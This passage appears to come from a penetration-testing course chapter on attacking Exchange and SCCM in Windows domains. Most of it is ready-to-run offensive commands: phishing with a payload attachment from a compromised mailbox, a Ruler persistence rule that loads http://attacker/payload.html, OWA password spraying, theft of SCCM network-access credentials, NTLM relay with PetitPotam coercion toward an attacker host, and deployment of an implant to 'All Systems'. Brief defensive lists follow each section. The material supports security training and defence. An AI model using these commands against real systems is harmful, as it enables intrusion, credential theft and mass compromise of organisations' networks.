Patching: Exchange vulnerabilities have been actively exploited in the wild. Always verify patch levels during an assessment. Microsoft publishes Exchange build numbers at https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates.

14.2.4 Exchange Phishing Attacks

Internal phishing from a compromised mailbox is highly effective because the email originates from a trusted sender within the organization.

# Send phishing email via EWS from a compromised mailbox
$cred = New-Object System.Management.Automation.PSCredential("CORP\compromised", (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force))

# Using MailSniper
Send-EWSEmail -ExchHostname mail.corp.local -Recipient target@corp.local -Subject "Urgent: Review Required" -Body "Please review the attached document." -Attachment "C:\Temp\payload.docx"
# Ruler: interact with Exchange via MAPI/RPC
ruler -u user@corp.local -p 'P@ssw0rd' --email user@corp.local display
# Create Outlook homepage rule for persistence
ruler -u user@corp.local -p 'P@ssw0rd' --email user@corp.local homepage add --url http://attacker/payload.html

14.2.5 Exchange Defensive Considerations

  • Patch promptly: Exchange vulnerabilities are frequently exploited within days of disclosure
  • Restrict OWA/ECP exposure: limit access to internal networks or VPN connections
  • Disable legacy protocols: MAPI/RPC, POP3, IMAP unless required
  • Monitor mailbox rules: detect suspicious forwarding rules and homepage persistence
  • Segment Exchange servers: restrict network access to required ports only
  • Review Exchange permissions in AD: Exchange groups have powerful default AD rights

Methodology

  • Discover Exchange servers via DNS: 
    dig MX corp.local
nslookup -type=srv _autodiscover._tcp.corp.local
  • Identify Exchange version from OWA headers: 
    curl -sk https://mail.corp.local/owa/ -I | grep X-OWA-Version
  • Password spray against OWA with MailSniper: 
    Invoke-PasswordSprayOWA -ExchHostname mail.corp.local -UserList users.txt -Password 'Spring2024!'
  • Search mailboxes for sensitive content: 
    Invoke-SelfSearch -Mailbox user@corp.local -ExchHostname mail.corp.local -Terms "password","credentials","vpn"
  • Enumerate the Global Address List: 
    Get-GlobalAddressList -ExchHostname mail.corp.local -UserName CORP\user -Password 'P@ssw0rd'
  • Check for known Exchange vulnerabilities (ProxyLogon, ProxyShell, ProxyNotShell) based on build number
  • Send internal phishing email from a compromised mailbox via EWS: 
    Send-EWSEmail -ExchHostname mail.corp.local -Recipient target@corp.local -Subject "Urgent: Review Required" -Body "Please review the attached document." -Attachment "C:\Temp\payload.docx"
  • Create Outlook homepage rule for persistence with Ruler: 
    ruler -u user@corp.local -p 'P@ssw0rd' --email user@corp.local homepage add --url http://attacker/payload.html

14.3 SCCM Enumeration and Exploitation

System Center Configuration Manager (SCCM), now Microsoft Endpoint Configuration Manager (MECM), manages software deployment, patching, and configuration across enterprise Windows environments. Its architecture creates privileged attack paths:

14.3.1 Introduction to SCCM

System Center Configuration Manager (SCCM), now Microsoft Endpoint Configuration Manager (MECM), manages software deployment, patching, and configuration across enterprise Windows environments. Its architecture creates privileged attack paths:

  • Site Server: central management point; runs the SMS Provider
  • Management Point (MP): client-facing communication endpoint
  • Distribution Point (DP): hosts content packages for client deployment
  • Site Database: MSSQL database storing all configuration and inventory data
  • SCCM Client: agent installed on managed endpoints
  • Network Access Account (NAA): domain account used by clients to access distribution points

14.3.2 SCCM Auditing and Enumeration

# Discover SCCM infrastructure
# Look for management point via DNS
nslookup -type=srv _mssms_mp_.corp.local

# SharpSCCM: enumerate SCCM from a domain-joined client
execute-assembly /opt/tools/SharpSCCM.exe ; local site-info
execute-assembly /opt/tools/SharpSCCM.exe ; get site-info -mp MP01.corp.local
execute-assembly /opt/tools/SharpSCCM.exe ; get collections
execute-assembly /opt/tools/SharpSCCM.exe ; get devices

# Enumerate NAA credentials
execute-assembly /opt/tools/SharpSCCM.exe ; local naa
# PowerSCCM
Import-Module PowerSCCM.ps1
Find-SccmSiteCode -ComputerName MP01
Get-SccmSession -ComputerName MP01 -SiteCode ABC
Get-SccmCollection
Get-SccmDevice

14.3.3 Abusing SCCM

SCCM provides several attack paths for privilege escalation and lateral movement.

# Retrieve NAA credentials from the local SCCM client policy
# NAA credentials are stored in WMI and protected by DPAPI
execute-assembly /opt/tools/SharpSCCM.exe ; local naa -m wmi

# Deploy an application to a specific collection (requires admin on SCCM)
execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "C:\Windows\Temp\implant.exe" -c DeviceCollectionID -mp MP01.corp.local -sc ABC

# Run a script on a device via CMPivot (requires appropriate permissions)
execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "whoami" --run-as-script -d TARGET01 -mp MP01.corp.local -sc ABC

Methodology

  • Discover SCCM management point via DNS: 
    nslookup -type=srv _mssms_mp_.corp.local
  • Enumerate SCCM site info, collections, and devices with SharpSCCM: 
    execute-assembly /opt/tools/SharpSCCM.exe ; local site-info
execute-assembly /opt/tools/SharpSCCM.exe ; get collections
execute-assembly /opt/tools/SharpSCCM.exe ; get devices
  • Extract NAA credentials from the local SCCM client: 
    execute-assembly /opt/tools/SharpSCCM.exe ; local naa
execute-assembly /opt/tools/SharpSCCM.exe ; local naa -m wmi
  • Enumerate SCCM with PowerSCCM: 
    Import-Module PowerSCCM.ps1
Find-SccmSiteCode -ComputerName MP01
Get-SccmSession -ComputerName MP01 -SiteCode ABC
Get-SccmDevice
  • Deploy an application to a target collection: 
    execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "C:\Windows\Temp\implant.exe" -c DeviceCollectionID -mp MP01.corp.local -sc ABC
  • Execute a script on a specific device via CMPivot: 
    execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "whoami" --run-as-script -d TARGET01 -mp MP01.corp.local -sc ABC

14.4 SCCM Site Takeover and Post-Exploitation

If the SCCM site database allows NTLM authentication, coercing the site server to authenticate to an attacker-controlled host enables relay to the SQL database.

14.4.1 SCCM Site Takeover I: NTLM Relay to MSSQL Site Database

If the SCCM site database allows NTLM authentication, coercing the site server to authenticate to an attacker-controlled host enables relay to the SQL database.

# Setup NTLM relay targeting the MSSQL site database
impacket-ntlmrelayx -t mssql://SQL01.corp.local -q "USE CM_ABC; INSERT INTO..." --no-http-server -smb2support

# Coerce the site server to authenticate (PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py attacker-ip SITESERVER.corp.local

# If successful, the relay grants sysadmin on the site database
# From there, grant Full Administrator in SCCM via SQL queries

14.4.2 SCCM Site Takeover II: NTLM Relay to SMS Provider and Passive Server

The SMS Provider exposes WMI and AdminService (REST API) for SCCM administration. Relaying authentication to the SMS Provider or a passive site server grants administrative access to SCCM.

# Relay to the SMS Provider AdminService
impacket-ntlmrelayx -t https://SMSPROVIDER.corp.local/AdminService/wmi/SMS_Admin -smb2support

# Coerce authentication from a privileged account
python3 PetitPotam.py attacker-ip DC01.corp.local

14.4.3 SCCM Post-Exploitation

# Extract stored credentials from SCCM
# Task sequence passwords, NAA credentials, collection variables
execute-assembly /opt/tools/SharpSCCM.exe ; get secrets

# Extract all NAA credentials from the site database (requires DB access)
# Credentials are encrypted with the SCCM site key

# Deploy a script or application to all systems for mass lateral movement
execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "C:\Windows\Temp\implant.exe" -c "All Systems" -mp MP01.corp.local -sc ABC

# Use SCCM client push installation account (often has local admin everywhere)
# Extract from the site database or intercept during client push

14.4.4 SCCM Defensive Considerations

  • Require HTTPS for all client communication: prevents credential interception
  • Remove the NAA: use Enhanced HTTP or a PKI-based approach instead
  • Restrict site server permissions: minimize accounts with Full Administrator
  • Enable Kerberos-only authentication for the site database: prevents NTLM relay
  • Monitor SCCM admin activity: audit application deployments, script execution, and admin changes
  • Harden the site database: restrict access to the MSSQL instance hosting CM_ database
  • Segment SCCM infrastructure: site servers, management points, and databases on restricted networks
  • Review SCCM with Misconfiguration Manager: open-source SCCM attack and defense resource

Methodology

  • Set up NTLM relay targeting the MSSQL site database: 
    impacket-ntlmrelayx -t mssql://SQL01.corp.local -q "USE CM_ABC; INSERT INTO..." --no-http-server -smb2support
  • Coerce the site server to authenticate (PetitPotam): 
    python3 PetitPotam.py attacker-ip SITESERVER.corp.local
  • Relay to SMS Provider AdminService for SCCM admin access: 
    impacket-ntlmrelayx -t https://SMSPROVIDER.corp.local/AdminService/wmi/SMS_Admin -smb2support
  • Extract stored secrets (task sequence passwords, NAA, collection variables): 
    execute-assembly /opt/tools/SharpSCCM.exe ; get secrets
  • Deploy implant to all systems for mass lateral movement: 
    execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "C:\Windows\Temp\implant.exe" -c "All Systems" -mp MP01.corp.local -sc ABC
  • Recover the SCCM client push installation account from the site database for local admin access across managed systems
